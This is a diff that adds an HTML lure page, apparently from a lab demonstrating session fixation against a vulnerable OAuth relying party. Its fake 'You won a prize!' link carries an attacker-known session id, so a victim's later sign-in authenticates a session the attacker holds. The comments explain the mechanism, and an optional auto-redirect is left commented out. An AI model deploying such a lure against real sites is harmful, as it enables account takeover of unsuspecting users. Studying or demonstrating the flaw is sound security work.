@@ -1,0 +1,25 @@
+<!DOCTYPE html>
+<html>
+<head><title>You won a prize!</title></head>
+<body>
+  <h1>Congratulations! You won a prize 🎉</h1>
+  <p>Click below to claim your reward by signing in:</p>
+
+  <!--
+    The link points at the vulnerable RP's login, but with ?sid=<attacker's own
+    session id> appended. Because the vulnerable RP adopts a session id from the
+    URL, the victim's browser is pinned to a session the attacker already knows.
+    When the victim then completes the OAuth login, that same session becomes
+    authenticated -- and the attacker still holds it.
+    attacker-server.js injects the real attacker session id in place of the
+    placeholder below.
+  -->
+  <a id="claim" href="SET_BY_SERVER">Claim your prize &raquo;</a>
+
+  <script>
+    // Optional: auto-redirect to make the fixation hands-free during a demo.
+    // Comment this out to require a manual click instead.
+    // window.location = document.getElementById('claim').href;
+  </script>
+</body>
+</html>
